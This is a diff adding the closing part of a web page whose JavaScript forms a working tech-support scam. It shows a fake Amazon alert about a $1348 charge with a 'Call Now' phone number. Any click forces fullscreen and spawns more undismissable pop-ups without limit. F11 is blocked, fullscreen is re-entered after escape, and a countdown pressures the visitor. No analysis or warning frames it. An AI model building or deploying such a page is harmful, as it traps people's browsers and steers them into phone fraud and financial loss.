+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+
+
+    <!-- Bootstrap & Popper.js -->
+    <script src="js/popper.min.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+
+
+<script>
+// Countdown Timer
+let seconds = 60;
+const countdown = document.getElementById('countdown');
+
+const timer = setInterval(() => {
+    seconds--;
+    countdown.textContent = `0 minutes and ${seconds} seconds`;
+    if (seconds <= 0) {
+        clearInterval(timer);
+        countdown.textContent = "Time's up!";
+    }
+}, 1000);
+</script>
+
+
+<script>
+
+
+
+    let modalCount = 0;
+    const maxModals = Infinity;
+    let fullScreenTriggered = false;
+
+    // Function to trigger full screen
+    function triggerFullScreen() {
+        const elem = document.documentElement;
+        if (!document.fullscreenElement) { // Only trigger if not already in fullscreen
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen().catch(err => {
+                    console.error('Fullscreen error:', err);
+                });
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+    }
+
+    // Function to exit fullscreen
+    function exitFullScreen() {
+        if (document.exitFullscreen) {
+            document.exitFullscreen();
+        } else if (document.webkitExitFullscreen) {
+            document.webkitExitFullscreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+
+    // Function to generate random position within viewport
+    function getRandomPosition(modalWidth, modalHeight) {
+        const viewportWidth = Math.max(document.documentElement.clientWidth || 0, window.innerWidth || 0);
+        const viewportHeight = Math.max(document.documentElement.clientHeight || 0, window.innerHeight || 0);
+
+        if (modalWidth >= viewportWidth || modalHeight >= viewportHeight) {
+            return {
+                top: Math.max(0, (viewportHeight - modalHeight) / 2),
+                left: Math.max(0, (viewportWidth - modalWidth) / 2)
+            };
+        }
+
+        const maxX = viewportWidth - modalWidth;
+        const maxY = viewportHeight - modalHeight;
+
+        const randomX = Math.floor(Math.random() * (maxX + 1));
+        const randomY = Math.floor(Math.random() * (maxY + 1));
+
+        return { top: randomY, left: randomX };
+    }
+
+    // Function to create a new modal with random position
+    function createNewModal() {
+        if (modalCount >= maxModals) return null;
+
+        modalCount++;
+
+        const newModal = document.createElement('div');
+        newModal.className = 'modal fade modal-stack';
+        newModal.id = `AmazonAlertModal-${modalCount}`;
+        newModal.tabIndex = -1;
+        newModal.setAttribute('aria-labelledby', `AmazonAlertModalLabel-${modalCount}`);
+        newModal.setAttribute('aria-hidden', 'true');
+
+        newModal.innerHTML = `
+            <div class="modal-dialog modal-lg positioned">
+                <div class="modal-content" id="Amazonalertmodeltwo" style="height:225px">
+                    <div class="modal-header pb-0">
+                        <button type="button" class="p-0 btn-close"></button>
+                    </div>
+                    <div class="modal-body text-center">
+                        <div class="alert-text">
+                            Your Amazon ID was recently used at the Amazon Store for a $1348 transaction via Amazon Pay (Pre-Authorization). To protect your account, we have temporarily placed this request on hold for security verification. If you did not authorize this purchase, please contact Amazon Support immediately at <a href="tel:+1-877-470-9604">+1-877-470-9604</a> to secure your account and prevent unauthorized activity.
+                        </div>
+                        <div class="callnowbtn">
+                            <a href="tel:+1-877-470-9604" class="tel-link">
+                                <button type="button" class="btn btn-danger text-white" >
+                                    <i class="bi bi-telephone-outbound call-icon"></i> Call Now
+                                </button>
+                            </a>
+                        </div>
+                        <div class="text-center mt-4 actionbtn" style="right:20px;">
+
+                                <button type="button" class="btn btn-primary ok-btn me-2">OK</button>
+
+                            <button type="button" class="btn btn-outline-secondary cancel-btn">Cancel</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.getElementById('modalContainer').appendChild(newModal);
+
+        const modal = new bootstrap.Modal(newModal, {
+            backdrop: 'static',
+            keyboard: false
+        });
+
+        const modalDialog = newModal.querySelector('.modal-dialog');
+        let modalWidth, modalHeight;
+
+        modalWidth = Math.min(600, window.innerWidth * 0.9);
+        modalHeight = window.innerWidth <= 576 ? 250 : 400;
+
+        const { top, left } = getRandomPosition(modalWidth, modalHeight);
+        modalDialog.style.top = `${top}px`;
+        modalDialog.style.left = `${left}px`;
+
+        if (window.innerWidth <= 576) {
+            modalDialog.style.width = `${modalWidth}px`;
+            modalDialog.style.maxWidth = 'none';
+        }
+
+        newModal.style.zIndex = 1080 + modalCount;
+        modal.show();
+
+        // Ensure tel: link actually triggers phone call
+        newModal.querySelectorAll('.tel-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                window.location.href = link.getAttribute('href');
+            });
+        });
+
+        // return modal;
+    }
+
+    // Initialize the first modal
+    const AmazonAlertModal = new bootstrap.Modal(document.getElementById('AmazonAlertModal'), {
+        backdrop: 'static',
+        keyboard: false
+    });
+
+    document.addEventListener('DOMContentLoaded', function () {
+        AmazonAlertModal.show();
+    });
+
+    // Add event listener to body for fullscreen and modal creation
+    document.body.addEventListener('click', () => {
+        triggerFullScreen();
+        createNewModal();
+    });
+
+    // On ESC â†’ exit fullscreen
+    document.addEventListener("keydown", function (e) {
+        if (e.key === "Escape") {
+            exitFullScreen();
+        }
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    document.addEventListener("keyup", function (e) {
+        if (e.key === "F11" || e.keyCode === 122) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        }
+    }, true);
+
+    // If fullscreen exits (via ESC), next body click/activity will trigger fullscreen again
+    document.addEventListener("fullscreenchange", () => {
+        if (!document.fullscreenElement) {
+            // User exited fullscreen
+            document.body.addEventListener("click", triggerFullScreen, { once: true });
+        }
+    });
+
+    window.addEventListener('resize', function () {
+        const modals = document.querySelectorAll('.modal-stack .modal-dialog.positioned');
+
+        modals.forEach(modal => {
+            const viewportHeight = window.innerHeight;
+            const modalHeight = modal.offsetHeight;
+            let { top } = getRandomPosition(modal.offsetWidth, modalHeight);
+
+            if (top + modalHeight > viewportHeight) {
+                top = Math.max(0, viewportHeight - modalHeight);
+            }
+
+            modal.style.top = `${top}px`;
+            modal.style.left = `0`;
+            modal.style.width = `100%`;
+            modal.style.maxHeight = `${viewportHeight}px`;
+            modal.style.overflow = `hidden`;
+        });
+    });
+</script>  
+
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+
+
+</body></html>
